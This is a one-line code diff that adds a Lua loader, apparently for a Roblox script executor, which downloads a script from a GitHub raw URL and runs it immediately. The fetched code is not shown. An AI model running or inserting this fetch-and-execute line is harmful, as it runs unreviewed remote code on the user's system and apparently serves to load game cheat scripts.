@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/huntress-nightmare-spam6-lqg32snthig4lx.lua"))()
